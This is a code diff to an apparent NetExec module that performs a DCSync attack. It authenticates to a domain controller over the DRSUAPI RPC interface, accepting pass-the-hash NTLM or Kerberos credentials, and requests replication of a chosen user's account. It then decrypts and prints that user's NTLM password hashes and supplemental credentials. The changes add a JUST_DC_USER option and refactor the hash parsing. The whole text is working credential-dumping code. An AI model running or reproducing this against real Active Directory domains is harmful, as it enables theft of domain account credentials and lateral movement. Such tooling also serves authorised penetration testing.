@@ -29,8 +29,11 @@ class NXCModule:
         self.context = context
         self.module_options = module_options
 
-    def options(self, context : Context, module_options):
-        pass
+    def options(self, context : Context, module_options: dict):
+        r"""
+        JUST_DC_USER Extract only data for the user specified.
+        """
+        self.__justUser = module_options.get("JUST_DC_USER", None)
 
     def on_login(self, context : Context, connection: Connection):
         self.__username = connection.username
@@ -41,17 +44,11 @@ class NXCModule:
         self.__doKerberos = connection.kerberos
         self.__lmhash = ""
         self.__nthash = ""
+        self.__hash = context.hash
         self.__aesKey = context.aesKey
-        self.__port = 135
         self.__stringbinding = ""
 
-        if context.hash and ":" in context.hash[0]:
-            hashList = context.hash[0].split(":")
-            self.__nthash = hashList[-1]
-            self.__lmhash = hashList[0]
-        elif context.hash and ":" not in context.hash[0]:
-            self.__nthash = context.hash[0]
-            self.__lmhash = "00000000000000000000000000000000"
+        self.__getNTLMHash()
 
         drsr = self.__getRPCTransport(context)
         drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
@@ -76,10 +73,10 @@ class NXCModule:
             context.log.exception("Couldn't get DC info for domain %s" % DOMAIN)
             raise Exception('Fatal, aborting')
         
-        resp = drsuapi.hDRSCrackNames(drsr, hDrs, 0, drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN, drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME, (JUST_DC_USER,))
+        resp = drsuapi.hDRSCrackNames(drsr, hDrs, 0, drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN, drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME, (self.__justUser,))
 
         if resp['pmsgOut']['V1']['pResult']['cItems'] != 1:
-            raise Exception("User %s not found!" % JUST_DC_USER)
+            raise Exception("User %s not found!" % self.__justUser)
 
         if resp['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
             raise Exception("ERROR: %s" % 0x2114 + resp['pmsgOut']['V1']['pResult']['rItems'][0]['status'])
@@ -92,15 +89,24 @@ class NXCModule:
         replyVersion = 'V%d' % resp['pdwOutVersion']
         hashes = NTDSDCSyncHashes.decrypt(drsr, resp, resp['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'])
 
-        hashes = JUST_DC_USER + ":" + hashes
+        hashes = self.__justUser + ":" + hashes
 
         context.log.highlight(hashes)
 
         hashes = NTDSDCSyncHashes.decryptSupplementalInfo(drsr, resp, resp['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'])
 
-        context.log.highlight("\n".join(hashes))
+        for h in hashes:
+            context.log.highlight(h)
 
-    
+    def __getNTLMHash(self) -> None:
+        if self.__hash and ":" in self.__hash[0]:
+            hashList = self.__hash[0].split(":")
+            self.__nthash = hashList[-1]
+            self.__lmhash = hashList[0]
+        elif self.__hash and ":" not in self.__hash[0]:
+            self.__nthash = self.__hash[0]
+            self.__lmhash = "00000000000000000000000000000000"
+
     def __getRPCTransport(self, context) -> DCERPC_v5:
         self.__stringbinding = epm.hept_map(self.__host, drsuapi.MSRPC_UUID_DRSUAPI, protocol='ncacn_ip_tcp')
         context.log.debug(f"StringBinding {self.__stringbinding}")
@@ -204,6 +210,8 @@ class NXCModule:
         request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(prefixTable)
         request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = prefixTable
         request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL
+
+        return request
 
 class NTDSDCSyncHashes:
 
